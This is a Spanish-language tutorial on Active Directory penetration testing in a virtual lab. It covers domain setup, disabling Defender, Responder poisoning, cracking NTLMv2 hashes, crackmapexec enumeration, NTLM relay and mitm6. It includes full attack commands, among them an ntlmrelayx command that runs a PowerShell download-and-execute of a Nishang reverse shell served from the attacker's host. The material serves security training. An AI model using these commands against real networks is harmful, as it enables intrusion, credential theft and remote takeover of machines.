---
icon: building-memo
---

# Active Directory Hacking (Auditorias entorno real)

Se van a tocar muchas tecnicas de hacking etico relacionadas con `Windows` para un entorno real de auditoria en una empresa, ya que los CTF's son tecnicas preparadas y tienen similitud a esto siguiente, pero en este caso, esto es mas realista a la hora de ir a un entorno mas real, tocaremos diversas tecnicas y utilizaremos herramientas, a parte de que trabajaremos con un entorno controlado mediante una serie de maquinas virtuales creando un `lab`.

## <mark style="color:purple;">Buenas configuraciones en los equipos/servidore</mark>s

Supongamos que tenemos un `Windows Server 2016`, un `PC-Marcelo` y un `PC-Ramlux` con los cuales vamos hacer una auditoria, lo primero es ver el nombre del sistema que este correctamente editado y no por defecto, para no dar pistas a los `Ciberdelincuentes` que intenten hackear nuestro sistema, para ello en `Windows Server 2016` daremos click derecho en `Windows` -> `Sistema` -> `Cambiar configuracion` -> `Cambiar` y aqui pondremos un nombre como `DC-Company`, ahora nos pedira reiniciarlo para que se apliquen los cambios, pero para cambiar los nombres en los equipos normales de `Windows` es algo parecido y diferente, para ello le daremos click derecho a `Windows` -> `Sistema` -> `Cambiar el nombre de este equipo` y le pondremos algo como `PC-Marcelo` y no pedira reiniciarlo para que se apliquen los cambios, de la misma forma con el otro equipo o en un caso real con los equipos que vengan con el nombre por defecto.

### Configuracion LAB (Server DC `Domain Controller`)

Para configurar nuestro `Windows Server 2016` en un DC (`Domain Controller`) haremos lo siguiente:

En `Administrador del servidor` -> `Administrar` -> `Agregar roles y caracteristicas` y marcaremos la opcion `Omitir esta pagina de manera predeterminada`, despues le daremos a `Siguiente` dejaremos la opcion de `Instalacion basada en caracteristicas o en roles`, le daremos a `Siguiente`, le volveremos a dar a `Siguiente`, aqui marcaremos un rol mas llamado `Servicios de dominio de Active Directory` -> `Agregar caracteristicas`, despues le daremos a `Siguiente`, le volveremos a dar a `Siguiente`, `Siguiente` -> `Instalar`

Y con esto solamente estariamos instalando los componentes necesarios para crear nuestro `DC`.

Ahora una vez hecho esto nos aparecera una notificacion en una bandera, en la que si pulsamos nos dira que requiere una configuracion, por lo que le daremos al boton llamado `Promover este servidor a controlador de dominio`, le daremos a `Añadir un nuevo bosque` y en el podremos poner el dominio que queramos (Ejemplo: `d1sec0rp.local`), de aqui le damos a `Siguiente`, en esta parte podremos configurarle una contraseña (Ejemplo: `P@$$w0rd!`) -> `Siguiente` -> `Siguiente` -> `Siguiente` -> `Siguiente` -> `Siguiente` -> `Siguiente` -> `Instalar`, por ultimo se nos reiniciara solo para que se apliquen todos los cambios.

Y con esto ya tendriamos nuestro `Windows Server 2016` como un `DC`. (Con esto lo que hacemos es que todas las maquinas esten en un mismo dominio, que dependan entre si, creando asi una red comunicada de unas con otras)

### Configuracion de quipos generales

Desactivaremos el `Windows Defender` en todos los equipos para poder realizar todas las tecnicas de atacaques, en un entorno real pueden surgir complicaciones como estas, pero para eso lo desactivaremos para aprender bien las tecnicas y que cuando surgan complicaciones como el `Windows Defender` poder utilizar diversas tecnicas. (Hay muchas tecnicas que se pueden utilizar para burlas el `Windows Defender`)

En el `Windows Server 2016` ejecutaremos como administrador el `Power Shell ISE` y pondremos lo siguiente para desactivar el `Windows Defender`:

```powershell
Uninstall-WindowsFeature -Name Windows-Defender
```

Reiniciamos el servidor y ya estarian aplicados estos cambios.

> NOTA

Hay ciertas tecnicas que se pueden hacer con el `Windows Defender` solo que para aprender mas y que todo salga bien y practicar mucho mejor, lo desactivaremos todo por si acaso.

Ahora llendonos a los equipos, daremos click derecho al adaptador de red -> `Abrir configuracion de red e internet` -> `Cambiar opciones del adaptador` -> `Doble click en el adaptador de red` -> `Propiedades` -> `Protocolo de internet version 4 (TCP/IPv4)`, aqui tendremos que ponerle la configuracion `DNS` del `Windows Server 2016`.

Para ello volveremos a nuestro servidor, abriremos el `cmd` y pondremos:

```cmd
ipconfig
```

Nos tendremos que fija en la `IP` y una vez sabiendo la `IP` (Ejemplo: `192.168.94.136`) nos iremos al equipo donde estabamos configurando los `DNS`, marcaremos la opcion `Usar las siguientes direcciones de servidor DNS:` y en la primera parte meteremos la `IP` del `Windows Server 2016` y en la segunda parte pondremos por ejemplo `1.1.1.1` -> `Aceptar` -> `Aceptar` -> `Cerrar` y ya cerrariamos todo.

Ahora si abrimos `cmd` en el equipo y hacemos un `ping` al dominio del servidor, tendremos que ver que nos hace ping, por lo que estarian comunicados:

```cmd
ping d1sec0rp.local
```

Ahora buscaremos `Obtener acceso a trabajo o escuela`, de ahi le daremos a `Conectar`, pero antes en el `Windows Server 2016` crearemos unos usuarios a nivel de directorio activo de la siguiente forma.

`Herramientas` -> `Usuarios y equipos de Active Directory` -> Abrir la carpeta `d1sec0rp.local` y donde pone `Users`, aqui crearemos los usuarios -> `Crear un nuevo usuario en el contenedor actual` (Aqui lo que estamos haciendo es crear un usuario del dominio `Active Directory` no locales), rellenamos la informacion adecuada y le daremos a `Siguiente` -> rellenamos los campos de contraseña, deseleccionamos la casilla `El usuario debe cambiar la contraseña en el siguiente inicio de sesion` y marcar la casilla `La contraseña nunca expira`, le damos a `Siguiente` -> `Finalizar`

Este mismo proceso lo haremos con el usuario `Ramlux`.

Siguiendo en el quipo de `Marcelo` cuando le hayamos dado a `Conectar` pincharemos en la seccion llamada `Unir este dispositivo a un dominio local de Active Directory` -> como ya tenemos interconectado la `IP` del servidor con el equipo, podremos poner como nombre directamente el dominio (`d1sec0rp.local`), le daremos a `Siguiente` -> nos saltara una autenticacion a nivel de dominio con las credenciales que creamos al usuario `Marcelo`, por ejemplo tendria que ser algo asi:

```
User = mvazquez
Pass = Password1
```

Una vez que nos conecte, le daremos a `Omitir` -> `Reiniciar ahora`

Con esto que hemos hecho es que ahora podremos alternar entre una autenticacion a nivel de dominio y otra a nivel local.

Repetiremos el mismo proceso con el otro equipo.

### Conexion al usuario del dominio Active Directory

Una vez que estemos en el login, le daremos a `Otro usuario` y debajo nos aparecera algo como `Iniciar sesion en D1SEC0RP` por lo que nos lo estaria cogiendo bien, ahora pondremos las credenciales del usuario a nivel de dominio:

```
User = mvazquez@d1sec0rp.local
Pass = Password1
```

Y con esto ya estariamos dentro con el usuario del dominio de `Active Directory` que creamos en el servidor.

## Desactivar Windows Defender (Proximos ataques)

Buscaremos `Firewall de Windows Defender` -> `Activar o Desactivar el Firewall de Windows Defender` -> esto pedira una autenticacion como administrador, metemos las credenciales del admin que se hayan configurado y entraremos dentro de otra ventana, dentro de ella desactivaremos todas las opciones que esten activas y le daremos a `Aceptar`.

Despues nos iremos a otro apartado llamado `Seguridad de Windows` -> `Proteccion Antivirus y contra amenazas` -> `Administrar la configuracion` -> de aqui desactivaremos las siguiente:

1. Proteccion en tiempo real
2. Proteccion basada en la nube
3. Envio de muestra automatico
4. Proteccion contra alteraciones

Y con esto ya estaria listo para los ataques, haremos lo mismo con el otro usuario.

## <mark style="color:purple;">SMB Relay IPv4 (Practic</mark>a)

> NOTA

El `SMB` no suele estar firmado y como muchas configuraciones de empresas vienen por defecto en `SMB` no se logra validar la legitimidad del origen, por lo que podemos hacer cosas como estas...

Lo mas utilizado en las empresas es la comunicacion por `SMB` para cualquier tarea automatizada, impresoras, comparticion de archivos, etc... Pues esta tecnica llamada `SMB Relay` puedes estando a la escucha con una herramienta llamada `Responder.py` capturar esas peticiones de las conexiones que se hagan manualmente o automaticamente con los recursos de `SMB` dandote asi los hashes NTLM y con ellos poder hacer muchas mas cosas, a parte te dice el usuario y el dominio por el que se ha realizado dicha conexion, por lo que es muy util.

Esta tecnica se puede efectuar cuando el recurso al que se intenta conectar no existe, por lo que nosotros como atacantes que estamos envenenando esa conexion `SMB` nos hacemos pasar por el legitimo y la informacion nos llegaria a nosotros, en este caso en las empresas cuando estan las tareas automatizadas y un equipo esta apagado a la cual le tiene que llegar dicha conexion, va a fallar, por lo que ahi aprovechamos nosotros para capturar esos hashes (Pero no sirven para hacer un `Pass-The-Hash`, pero esto si lo podemos utilizar para crackearlo de forma offline y sacar credenciales legitimas)

> Ejemplo:

Para estar a la escucha haremos lo siguiente en nuestra terminal como atacante:

```shell
cd /usr/share/responder
python3 Responder.py -I eth0 -wd
```

Info:

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.5.147]
    Responder IPv6             [fe80::20c:29ff:fea0:3262]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X2SBPY74KEF]
    Responder Domain Name      [2X8X.LOCAL]
    Responder DCE-RPC Port     [45613]

[+] Listening for events...
```

Con esto estaremos a la escucha, por lo que si ahora manualmente alguien hace conexion a un recurso compartido mediante `SMB` de la siguiente forma...

En la barra de busqueda en la carpeta, ponemos `\\MYSQL\textodeprueba` simulando que nos vamos a conectar a un recurso compartido, en la terminal del atacante apareceria algo como esto:

```
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name MYSQL.local
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL.local
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name MYSQL.local
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name MYSQL
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name MYSQL
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL
[SMB] NTLMv2-SSP Client   : fe80::d59c:d3c0:7470:eeaa
[SMB] NTLMv2-SSP Username : D1SEC0RP\mvazquez
[SMB] NTLMv2-SSP Hash     : mvazquez::D1SEC0RP:b6d8080c0cf727f3:3E6397038C285069EBEDE9C5AE49BEB5:01010000000000008001F0E87D27DB0166211EABD7968EB90000000002000800320058003800580001001E00570049004E002D00580032005300420050005900370034004B004500460004003400570049004E002D00580032005300420050005900370034004B00450046002E0032005800380058002E004C004F00430041004C000300140032005800380058002E004C004F00430041004C000500140032005800380058002E004C004F00430041004C00070008008001F0E87D27DB0106000400020000000800300030000000000000000000000000200000665D6C46FE0C533A0643C3DA3D51E44434FA8335956688104976E453F4C1C9B00A001000000000000000000000000000000000000900140063006900660073002F004D005900530051004C000000000000000000
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name MYSQL.local
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL.local
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name MYSQL.local
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL.local
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name MYSQL
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name MYSQL
[*] Skipping previously captured hash for D1SEC0RP\mvazquez
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name MYSQL.local
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL.local
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name MYSQL.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name MYSQL
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name MYSQL.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name MYSQL
[*] Skipping previously captured hash for D1SEC0RP\mvazquez
```

Dando mucha informacion al atacante de lo que esta sucediendo en ese recurso y de la misma forma pata una tarea automatizada con los recursos mediante `SMB`.

### Crack Hashes obtenidos por Responder.py

Crearemos un archivo de texto en el que meteremos todos los hashes, tendria que quedar algo tal que asi:

```
mvazquez::D1SEC0RP:b6d8080c0cf727f3:3E6397038C285069EBEDE9C5AE49BEB5:01010000000000008001F0E87D27DB0166211EABD7968EB90000000002000800320058003800580001001E00570049004E002D00580032005300420050005900370034004B004500460004003400570049004E002D00580032005300420050005900370034004B00450046002E0032005800380058002E004C004F00430041004C000300140032005800380058002E004C004F00430041004C000500140032005800380058002E004C004F00430041004C00070008008001F0E87D27DB0106000400020000000800300030000000000000000000000000200000665D6C46FE0C533A0643C3DA3D51E44434FA8335956688104976E453F4C1C9B00A001000000000000000000000000000000000000900140063006900660073002F004D005900530051004C000000000000000000
Administrador::D1SEC0RP:7776aa16ee373eac:418647840BF467654EBB6D6A64B519CC:01010000000000008001F0E87D27DB01F4940C708FC009C00000000002000800320058003800580001001E00570049004E002D00580032005300420050005900370034004B004500460004003400570049004E002D00580032005300420050005900370034004B00450046002E0032005800380058002E004C004F00430041004C000300140032005800380058002E004C004F00430041004C000500140032005800380058002E004C004F00430041004C00070008008001F0E87D27DB01060004000200000008003000300000000000000000000000003000002283D10DC8CFB431446672A431597B9E91711EAEDF8573CDE2791393AB612B6A0A0010000000000000000000000000000000000009001A0063006900660073002F0053004D00420053006800610072006500000000000000000000000000
       ramlux::D1SEC0RP:86d93042260399a2:3DEC221E81575FA9F9A62A995D9C0779:01010000000000008001F0E87D27DB01EB99483145E6589E0000000002000800320058003800580001001E00570049004E002D00580032005300420050005900370034004B004500460004003400570049004E002D00580032005300420050005900370034004B00450046002E0032005800380058002E004C004F00430041004C000300140032005800380058002E004C004F00430041004C000500140032005800380058002E004C004F00430041004C00070008008001F0E87D27DB010600040002000000080030003000000000000000000000000020000095528CD6589A282AE4B8060A54B74AE5CE1E325486186D27A63AB8520877A5790A0010000000000000000000000000000000000009001E0063006900660073002F005400450053005400520061006D006C00750078000000000000000000
```

Y si la contraseña fuera debil, podremos crackearla sin ningun tipo de problema de la siguiente forma:

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

Y si son debiles, podremos obtener resultados:

```
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (mvazquez)     
Password2        (ramlux)     
P@$$w0rd!        (Administrador)     
3g 0:00:00:25 DONE (2024-10-26 08:29) 0.1198g/s 430055p/s 432673c/s 432673C/s PATRICIO_14..OrlandoBloom31377
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Por lo que vemos ya tendriamos las credenciales de los usuarios.

### Enumerar equipos (Crackmapexec con SMB)

Podremos utilizar `crackmapexec` para enumerar equipos en la red del mismo segmento de red y asi poder descrubrir informacion que nos puede ser muy util en un futuro.

> Ejemplo:

```shell
crackmapexec smb 192.168.5.0/24
```

Info:

```
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         192.168.5.1     445    MSI              [*] Windows 11 Build 22621 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)
SMB         192.168.5.150   445    DC-COMPANY       [*] Windows Server 2016 Standard 14393 x64 (name:DC-COMPANY) (domain:d1sec0rp.local) (signing:True) (SMBv1:True)
SMB         192.168.5.148   445    PC-MARCELO       [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-MARCELO) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.149   445    PC-RAMLUX        [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-RAMLUX) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
```

Y esto seria un ejemplo del `SMB Relay`, para esta tecnica hay que tener mucha paciencia ya que en un entorno real lloverian hashes y de ahi tendrias que filtrarlos, pero este tipo de ataque no pasa nada si el `Windows Defender` esta activado, ya que se podria hacer igualmente.

### Acceso al equipo

En este caso primero imaginemos que un equipo tiene un usuario con privilegios de administrador sobre ese equipo, primero haremos la siguiente configuracion en nuestro `lab` de la siguiente forma, nos iremos a uno de nuestros equipos en mi caso utilizare el `PC-Ramlux`.

`Administración de equipos` -> Click derecho `Ejecuta como administrador` -> `Usuarios y grupos locales` -> `Grupos` -> `Administradores` -> `Agregar...` -> Ponemos `mvaz` las iniciales del nombre de usuario al que queremos meter en el grupo de administradores para que lo detecte automaticamente -> `Aceptar` -> `Aplicar` -> `Aceptar`

Lo que acabamos de hacer es hacer como privilegiado el usuario `mvazquez` sobre el equipo de `ramlux`, por lo que sabiendo las credenciales del usuario que sacamos anteriormente, podremos hacer lo siguiente.

```shell
crackmapexec smb 192.168.5.0/24 -u 'mvazquez' -p 'Password1'
```

Info:

```
SMB         192.168.5.1     445    MSI              [*] Windows 11 Build 22621 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)
SMB         192.168.5.1     445    MSI              [-] MSI\mvazquez:Password1 STATUS_LOGON_FAILURE 
SMB         192.168.5.150   445    DC-COMPANY       [*] Windows Server 2016 Standard 14393 x64 (name:DC-COMPANY) (domain:d1sec0rp.local) (signing:True) (SMBv1:True)
SMB         192.168.5.148   445    PC-MARCELO       [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-MARCELO) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.149   445    PC-RAMLUX        [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-RAMLUX) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.150   445    DC-COMPANY       [+] d1sec0rp.local\mvazquez:Password1 
SMB         192.168.5.148   445    PC-MARCELO       [+] d1sec0rp.local\mvazquez:Password1 
SMB         192.168.5.149   445    PC-RAMLUX        [+] d1sec0rp.local\mvazquez:Password1 (Pwn3d!)
```

Por lo que vemos si pone `(Pwn3d!)` podremos hacer muchas cosas desde `carckmapexec`, es un metodo de verificarlo.

En algunos metodos de empresa se tendra que utilizar la `IPv6` en vez de la tipica `IPv4` como hemos echo anteriormente con `SMB Relay`, por lo que para hacerlo en ese protocolo haremos lo siguiente.

En la maquina del atacante:

```shell
cd /usr/share/responder
nano Responder.conf
```

Dentro del archivo de configuracion cambiaremos lo siguiente:

```
SMB = off
HTTP = off
```

Lo guardamos, creamos un archivo llamado `targets.txt` dentro del el pegaremos la IP del equipo en el que nos queremos meter, del previo escaneo de `carckmapexec` que hicimos anteriormente, en mi caso sera la siguiente del `PC-MARCELO`:

```
192.168.5.148
```

Con una herramienta llamada `impacket-ntlmrelayx` le puedes especificar un archivo de `targets`:

```shell
impacket-ntlmrelayx -tf targets.txt -smb2support
```

`-tf` = (Target Files)

`-smb2support` = (Especificamos que de soporte al SMBv2 ya que se utiliza un windows 10 y es muy probable que tenga ese tipo de version)

Por lo que en 2 ventanas de termianal estaremos a la escucha de cualquier evento mediante una busqueda de `SMB` erronea de la siguiente forma:

TERMINAL 1:

```shell
python3 Responder.py -I eth0 -wd
```

Info:

```
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod.local
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name jfdikaod.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name jfdikaod
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name jfdikaod
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name jfdikaod.local
[*] [NBT-NS] Poisoned answer sent to 192.168.5.148 for name JFDIKAOD (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name jfdikaod.local
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name jfdikaod
[*] [MDNS] Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod.local
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name jfdikaod
[*] [LLMNR]  Poisoned answer sent to fe80::d59c:d3c0:7470:eeaa for name jfdikaod
[*] [LLMNR]  Poisoned answer sent to 192.168.5.148 for name jfdikaod
[*] [MDNS] Poisoned answer sent to 192.168.5.148   for name jfdikaod.local
```

TERMINAL 2:

```shell
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Info:

```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] Received connection from D1SEC0RP/mvazquez at PC-MARCELO, connection will be relayed after re-authentication
[*] SMBD-Thread-5 (process_request_thread): Connection from D1SEC0RP/MVAZQUEZ@192.168.5.148 controlled, attacking target smb://192.168.5.148
[-] Authenticating against smb://192.168.5.148 as D1SEC0RP/MVAZQUEZ FAILED
[*] Received connection from D1SEC0RP/mvazquez at PC-MARCELO, connection will be relayed after re-authentication
[*] SMBD-Thread-6 (process_request_thread): Connection from D1SEC0RP/MVAZQUEZ@192.168.5.148 controlled, attacking target smb://192.168.5.148
[-] Authenticating against smb://192.168.5.148 as D1SEC0RP/MVAZQUEZ FAILED
[*] Received connection from D1SEC0RP/mvazquez at PC-MARCELO, connection will be relayed after re-authentication
[*] SMBD-Thread-7 (process_request_thread): Connection from D1SEC0RP/MVAZQUEZ@192.168.5.148 controlled, attacking target smb://192.168.5.148
[-] Authenticating against smb://192.168.5.148 as D1SEC0RP/MVAZQUEZ FAILED
[*] Received connection from D1SEC0RP/mvazquez at PC-MARCELO, connection will be relayed after re-authentication
[-] Authenticating against smb://192.168.5.148 as D1SEC0RP/MVAZQUEZ FAILED
[*] HTTPD(80): Connection from D1SEC0RP/MVAZQUEZ@192.168.5.148 controlled, attacking target smb://192.168.5.148
[-] Authenticating against smb://192.168.5.148 as D1SEC0RP/MVAZQUEZ FAILED
[*] HTTPD(80): Connection from D1SEC0RP/MVAZQUEZ@192.168.5.148 controlled, attacking target smb://192.168.5.148
```

Cuando el usuario busque algo que no exista sobre `SMB` o una tarea programada en el que el PC este apagado nos dara una informacion parecida a la anterior.

Y esto es funciona cuando el recurso compartido no existe ya que el ordendador esta apagado o cualquier otra cosa, por lo que envenenando la red podremos autenticarnos con el `SMB` de forma legitima falsificandolo y como el usuario `mvazquuez` tiene privilegios de administrador sobre el equipo de `ramlux` se podra autenticas con privilegios y que nos dumpee la `SAM` del equipo con los hashes.

Por lo que si te lo admite y la credencial es privilegiada, se podria hacer un `Pass-The-Hash`.

### Ejecuccion de comandos mediante el envenenamiento de la red

Nos clonamos el repositorio de `GitHub` llamado `Nishang`

URL = [GitHub Nishang](https://github.com/samratashok/nishang)

```shell
git clone https://github.com/samratashok/nishang.git
cd nishang
```

Nos vamos a la shell's:

```shell
cd Shells/
cp Invoke-PowerShellTcp.ps1 PS.ps1
nano !$
```

Dentro del archivo haremos lo siguiente:

```
# Copiaremos la siguiente linea:

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

# Y lo pegaremos al final del archivo ajustandolo a nuestras necesidades

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.5.147 -Port 4646

# La IP tiene que ser la de la maquina atacante y el puerto el que mas guste
```

Si nos abrimos un servidor de `python3`.

```shell
python3 -m http.server
```

Instalamos un paquete en otra terminal para estar a la escucha:

```shell
apt install rlwrap
```

```shell
rlwrap nc -lvnp 4646
```

Teniendo esto anterior a la escucha, lo que haremos es que en las otras 2 terminales prepararemos los siguientes comandos:

```shell
python3 Responder.py -I eth0 -wd 
```

```shell
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.5.147:8000/PS.ps1')"
```

Este ultimo comando lo que haya es que con el parametro `-c` estamos indicando que ejecute un coamando en el equipo, ya que el usuario con el que se esta haciendo tiene privilegios de administrador en el equipo `ramlux` y estamos diciendo que se descargue el archivo que preparamos llamado `PS.ps1` desde nuestro servidor de `python3` y estando a la escucha por dicho puerto cuando se ejecute ese `PS.ps1` nos creara una shell interactiva sobre el equipo de `marcelo` con privilegios de administrador sobre el equipo de `ramlux`.

## <mark style="color:purple;">SMB Relay IPv6 (Practica)</mark>

Aunque parchen la entrada por IPv4, tambien esta la opcion por IPv6 que es un poco mas diferente, pero se puede hacer si no esta mitigado de la siguiente forma, conociendo el dominio de la empresa, haremos lo siguiente:

```shell
sudo apt install mitm6
```

```shell
mitm6 -d d1sec0rp.local
```

Info:

```
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:a0:32:62]
IPv4 address: 192.168.5.147
IPv6 address: fe80::20c:29ff:fea0:3262
DNS local search domain: d1sec0rp.local
DNS allowlist: d1sec0rp.local
IPv6 address fe80::6185:1 is now assigned to mac=00:0c:29:40:84:22 host=PC-MARCELO.d1sec0rp.local. ipv4=
IPv6 address fe80::6185:2 is now assigned to mac=00:50:56:c0:00:08 host=MSI. ipv4=
IPv6 address fe80::6185:3 is now assigned to mac=00:0c:29:79:5c:87 host=PC-Ramlux.d1sec0rp.local. ipv4=
IPv6 address fe80::6185:4 is now assigned to mac=00:0c:29:a7:d5:fd host=DC-Company.d1sec0rp.local. ipv4=
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:2
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:1
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:3
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:3
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:3
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:3
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:1
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:1
Sent spoofed reply for wpad.d1sec0rp.local. to fe80::6185:1
```

Con esto ya nos aparecen los PC's que estan en el dominio como vimos en la IPv4.

Ahora si vamos al `cmd` de un equipo de los 2, podremos ver de la siguiente forma que en la puerta de enlace y en los servidores DNS tenemos envenenado con la misma en la que nos aparece con la herramienta `mitm6`:

En la herramienta vemos la siguiente linea...

```
IPv6 address: fe80::20c:29ff:fea0:3262
```

Y en el `cmd` de uno de los equipos vemos lo siguiente:

```cmd
ipconfig /all
```

Info:

```
Servidores DNS...................: fe80::20c:29ff:fea0:3262%7
```

Ahora en otra terminal haremos lo siguiente para meternos desde IPv6 en el quipo de `ramlux`:

```shell
impacket-ntlmrelayx -6 -wh 192.168.5.147 -t smb://192.168.5.149 -socks -debug -smb2support
```

Y esto nos va a desplegar una shell interactiva, haremos `Ctrl+L` para limpiar la terminal y si hacemos `socks` veremos lo siguiente:

```
[*] No Relays Available!
```

No tiene de momento nada, pero si buscamos algo mediante `SMB` aparecera mucha informacion y si volvemos hacer `socks` deberemos de ver algo asi:

```
SMB              192.168.5.149         D1SEC0RP/RAMLUX    FALSE      445
```

Y si lo hacemos con el otro usuario que tiene privilegios de admin sobre `ramlux`, deberemos de ver algo asi:

```
Protocol  Target         Username           AdminStatus  Port 
--------  -------------  -----------------  -----------  ----
SMB       192.168.5.149  D1SEC0RP/MVAZQUEZ  TRUE         445
```

